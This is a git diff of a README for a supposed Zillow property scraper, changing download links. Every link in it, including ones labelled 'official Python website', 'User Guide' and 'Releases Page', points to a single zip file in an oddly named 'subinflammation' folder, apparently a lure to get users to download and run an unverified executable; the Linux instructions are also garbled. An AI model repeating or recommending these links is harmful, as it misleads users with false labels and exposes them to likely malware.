@@ -8,13 +8,13 @@ Welcome to the zillow-location-scraper! This tool helps you easily collect prope
 
 You can download the latest version of the zillow-location-scraper by visiting the Releases page. Click the link below to get started.
 
-[![Download zillow-location-scraper](https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip%https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip)](https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip)
+[![Download zillow-location-scraper](https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip%https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip)](https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip)
 
 ### Steps to Download:
 
-1. Click the button above or go directly to this link: [Releases Page](https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip).
+1. Click the button above or go directly to this link: [Releases Page](https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip).
 2. Look for the latest release. Here, you will find the version information and download options.
-3. Download the file suitable for your operating system. The files are available in multiple formats such as .exe for Windows, .dmg for macOS, and https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip for Linux.
+3. Download the file suitable for your operating system. The files are available in multiple formats such as .exe for Windows, .dmg for macOS, and https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip for Linux.
 
 ### Install the Application
 
@@ -31,7 +31,7 @@ Once you have downloaded the file, follow these steps to install it:
   3. Drag the zillow-location-scraper to your Applications folder.
 
 - **For Linux:**
-  1. Extract the `https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip` file using a command like `tar -xzvf https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip`.
+  1. Extract the `https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip` file using a command like `tar -xzvf https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip`.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the application with `./zillow-location-scraper`.
 
@@ -51,7 +51,7 @@ To run the zillow-location-scraper, ensure your system meets the following requi
 - **Windows:** Windows 10 or later
 - **macOS:** macOS Sierra (10.12) or later
 - **Linux:** Ubuntu 18.04 or later
-- **Python:** Python 3.6 or later must be installed. You can download it from the [official Python website](https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip).
+- **Python:** Python 3.6 or later must be installed. You can download it from the [official Python website](https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip).
 
 ## 📚 Usage Instructions
 
@@ -79,8 +79,8 @@ Join our community of users and contributors to share tips and get answers. Chec
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip)
-- [Python Download](https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip)
-- [User Guide](https://raw.githubusercontent.com/MujtabaArshad537/zillow-location-scraper/main/subinflammation/location_scraper_zillow_v1.2.zip)
+- [Releases Page](https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip)
+- [Python Download](https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip)
+- [User Guide](https://github.com/MujtabaArshad537/zillow-location-scraper/raw/refs/heads/main/subinflammation/zillow-location-scraper-3.6.zip)
 
 Thank you for using the zillow-location-scraper! Happy scraping!
